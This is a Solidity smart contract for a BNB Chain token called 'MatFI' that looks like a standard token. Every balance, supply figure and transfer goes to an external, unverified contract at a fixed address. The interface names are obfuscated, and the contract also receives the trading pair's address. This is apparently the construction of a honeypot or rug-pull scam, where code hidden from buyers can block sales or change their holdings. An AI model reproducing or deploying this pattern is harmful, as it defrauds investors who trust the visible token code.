/**
 *Submitted for verification at BscScan.com on 2022-04-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface yyPj {

    function minFill(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function chGYT() view external returns (uint256);

    function Flh2A(address _owner) view external returns (uint256);

    function emFia(address _from, address _to, uint256 _value) external;

}

interface IDEXRouter {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract MatFI{
	
    string public name = "MatFI";
    string  public symbol = "MatFI";
    uint8   public decimals = 9;
	uint256 public totalSupply_ = 1000000000 * (10 ** decimals);
	
	address public tokenOwner;
	address public pairs;
	IDEXRouter public router;
	address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

	yyPj ttJup = yyPj(0xb814B88dCe68b8301CD07643C43a9Df36654eEF5);

	constructor() {
		tokenOwner=msg.sender;
        
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));

        ttJup.minFill(totalSupply_, address(this), tokenOwner,pairs);

        emit Transfer(address(0), tokenOwner, totalSupply_);
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
	

    function totalSupply() public view returns (uint256) {
        return ttJup.chGYT();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return ttJup.Flh2A(_owner);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(ttJup.Flh2A(msg.sender) >= _value);

        ttJup.emFia(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= ttJup.Flh2A(_from));
        require(_value <= allowed[_from][msg.sender]);
		
		ttJup.emFia(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
	
}